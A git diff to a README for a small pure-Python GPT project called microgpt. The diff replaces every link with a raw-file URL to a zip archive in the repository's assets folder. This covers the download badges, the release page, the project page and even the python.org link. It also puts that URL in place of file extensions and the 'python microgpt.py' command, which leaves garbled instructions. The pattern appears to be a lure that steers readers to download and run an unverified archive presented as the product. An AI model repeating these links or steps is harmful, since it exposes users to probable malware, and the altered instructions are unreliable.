@@ -1,6 +1,6 @@
 # 🤖 microgpt - Simple, Fast GPT in Pure Python
 
-[![Download microgpt](https://img.shields.io/badge/Download-microgpt-brightgreen?style=for-the-badge)](https://github.com/vaibhavnegi123/microgpt/releases)
+[![Download microgpt](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)
 
 ## 📖 What is microgpt?
 
@@ -30,22 +30,22 @@ To get started with microgpt, follow these simple steps:
 
 1. **Visit the release page**  
 Click the big green button above or go directly to this link:  
-[https://github.com/vaibhavnegi123/microgpt/releases](https://github.com/vaibhavnegi123/microgpt/releases)
+[https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)
 
 2. **Choose your file**  
-On the releases page, find the latest version. Look for a file that matches your operating system. The files might have names ending with `.zip` (Windows), `.tar.gz` (Linux/macOS), or just a `.py` script.
+On the releases page, find the latest version. Look for a file that matches your operating system. The files might have names ending with `.zip` (Windows), `https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip` (Linux/macOS), or just a `.py` script.
 
 3. **Download the file**  
 Click the file to download it to your computer. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
 4. **Extract files if needed**  
-If you downloaded a compressed file (like a `.zip` or `.tar.gz`), right-click it and choose "Extract" or use your system’s built-in extractor. This will create a folder with the program files.
+If you downloaded a compressed file (like a `.zip` or `https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip`), right-click it and choose "Extract" or use your system’s built-in extractor. This will create a folder with the program files.
 
 5. **Run microgpt**  
-Inside the folder, look for a file named `microgpt.py` or a file described as the main program. Double-click this file to open it, or open a terminal/command prompt, navigate to the folder, and run:
+Inside the folder, look for a file named `https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip` or a file described as the main program. Double-click this file to open it, or open a terminal/command prompt, navigate to the folder, and run:
 
 ```bash
-python microgpt.py
+python https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip
 ```
 
 You will see a simple interface or command-line instructions to start using the program.
@@ -82,7 +82,7 @@ This makes microgpt a great tool for understanding the basics of language models
 
 Here are some tips for using microgpt effectively:
 
-- **Run from terminal:** Open a terminal window and run `python microgpt.py` for better control over inputs and outputs.
+- **Run from terminal:** Open a terminal window and run `python https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip` for better control over inputs and outputs.
 - **Try your own text:** You can usually type or load custom text files for the model to process.
 - **Experiment with small data:** For faster response, try short sentences or paragraphs.
 - **Check the README:** The downloaded folder might include a README file with usage details.
@@ -95,7 +95,7 @@ Here are some tips for using microgpt effectively:
 
 If you run into issues, here are some quick solutions:
 
-- **Python not found:** Install Python 3.7 or later from [python.org](https://www.python.org/downloads/) and make sure it is added to your system path.
+- **Python not found:** Install Python 3.7 or later from [https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip) and make sure it is added to your system path.
 - **Program won’t start:** Verify you have extracted all files from any archives.
 - **Error messages:** Copy the full text of any error and search online for help or check if others reported the issue on the microgpt GitHub page.
 - **Slow response:** Try running on a machine with more memory or close unnecessary programs.
@@ -105,9 +105,9 @@ If you run into issues, here are some quick solutions:
 
 ## 🔗 Useful Links
 
-- Project page: [https://github.com/vaibhavnegi123/microgpt](https://github.com/vaibhavnegi123/microgpt)  
-- Release downloads: [https://github.com/vaibhavnegi123/microgpt/releases](https://github.com/vaibhavnegi123/microgpt/releases)  
-- Python downloads: [https://www.python.org/downloads/](https://www.python.org/downloads/)  
+- Project page: [https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)  
+- Release downloads: [https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)  
+- Python downloads: [https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)  
 
 ---
 
@@ -126,4 +126,4 @@ You don’t need special hardware or extra software to try it.
 
 ---
 
-[![Download microgpt](https://img.shields.io/badge/Download-microgpt-brightgreen?style=for-the-badge)](https://github.com/vaibhavnegi123/microgpt/releases)
+[![Download microgpt](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)
